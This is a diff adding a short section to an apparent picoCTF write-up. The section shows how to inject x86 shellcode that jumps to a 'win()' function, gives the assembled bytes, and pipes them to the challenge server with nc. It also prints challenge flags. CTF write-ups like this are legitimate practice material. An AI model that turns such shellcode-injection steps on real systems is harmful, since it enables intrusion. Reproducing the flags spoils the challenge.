@@ -82,3 +82,28 @@ Then, run `cat flag.txt`
 The flag is
 
 `f6f01bf0649b5aa5ec299bb51c8f8db4`
+
+## Shells
+We need to inject instructions to call the "win()" function. Radare2 tells us that the function
+is located at address `0x08048540`.
+An easy way is to just add the value to a register and call it:
+
+```
+mov eax, 0x08048540
+call eax
+```
+
+Radare2 gives us the following:
+
+```
+rasm2 -a x86 -b 32 'mov eax, 0x08048540; call eax'
+b840850408ffd0
+```
+
+Save the raw bytes to a file, then run
+
+`cat input| nc shell2017.picoctf.com 58279`
+
+The flag is
+
+`84f1e856de605076057b0687dfd0865f`
